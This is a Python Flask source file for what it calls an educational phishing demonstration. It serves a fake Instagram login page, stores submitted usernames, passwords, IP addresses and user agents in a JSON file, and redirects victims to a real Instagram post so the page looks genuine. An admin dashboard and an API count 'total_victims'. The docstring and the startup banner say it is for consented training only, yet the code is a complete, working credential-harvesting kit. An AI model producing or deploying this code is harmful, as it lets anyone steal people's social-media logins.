"""
EDUCATIONAL PHISHING DEMONSTRATION - ETHICAL USE ONLY
This tool is designed ONLY for cybersecurity awareness training.
Use only with explicit consent from participants in a controlled environment.
"""

from flask import Flask, render_template, request, redirect, url_for, jsonify
from datetime import datetime
import json
import os

app = Flask(__name__)

# Store captured credentials
CREDENTIALS_FILE = 'captured_data.json'
captured_credentials = []

def load_credentials():
    """Load existing credentials from file"""
    global captured_credentials
    if os.path.exists(CREDENTIALS_FILE):
        with open(CREDENTIALS_FILE, 'r') as f:
            try:
                captured_credentials = json.load(f)
            except:
                captured_credentials = []

def save_credentials():
    """Save credentials to file"""
    with open(CREDENTIALS_FILE, 'w') as f:
        json.dump(captured_credentials, f, indent=2)

@app.route('/')
def index():
    """Fake Instagram login page"""
    return render_template('instagram_login.html')

@app.route('/login', methods=['POST'])
def login():
    """Capture credentials and redirect to real Instagram post"""
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    # Capture the data with timestamp
    data = {
        'username': username,
        'password': password,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip_address': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'Unknown')
    }
    
    captured_credentials.append(data)
    save_credentials()
    
    print(f"\n{'='*60}")
    print(f"🎣 CREDENTIALS CAPTURED!")
    print(f"{'='*60}")
    print(f"Username: {username}")
    print(f"Password: {password}")
    print(f"Time: {data['timestamp']}")
    print(f"IP: {data['ip_address']}")
    print(f"{'='*60}\n")
    
    # Redirect to real Instagram post (makes it look legitimate!)
    instagram_post_url = "https://www.instagram.com/p/DQnya2Nkm8i/?hl=en"
    
    return redirect(instagram_post_url)

@app.route('/reveal')
def reveal():
    """Educational page explaining the phishing attack"""
    return render_template('reveal.html')

@app.route('/admin')
def admin():
    """Admin dashboard to view captured credentials"""
    load_credentials()
    return render_template('admin.html', credentials=captured_credentials)

@app.route('/admin/clear', methods=['POST'])
def clear_data():
    """Clear all captured data"""
    global captured_credentials
    captured_credentials = []
    if os.path.exists(CREDENTIALS_FILE):
        os.remove(CREDENTIALS_FILE)
    return redirect(url_for('admin'))

@app.route('/api/stats')
def stats():
    """API endpoint for real-time stats"""
    load_credentials()
    return jsonify({
        'total_victims': len(captured_credentials),
        'latest': captured_credentials[-5:] if captured_credentials else []
    })

if __name__ == '__main__':
    load_credentials()
    print("\n" + "="*70)
    print("  🔒 PHISHING DEMONSTRATION SERVER - EDUCATIONAL USE ONLY")
    print("="*70)
    print("\n📱 Main phishing page: http://localhost:5000")
    print("👁️  Admin dashboard: http://localhost:5000/admin")
    print("\n⚠️  WARNING: Use only for authorized security awareness training!")
    print("="*70 + "\n")
    
    app.run(debug=True, host='0.0.0.0', port=5000)
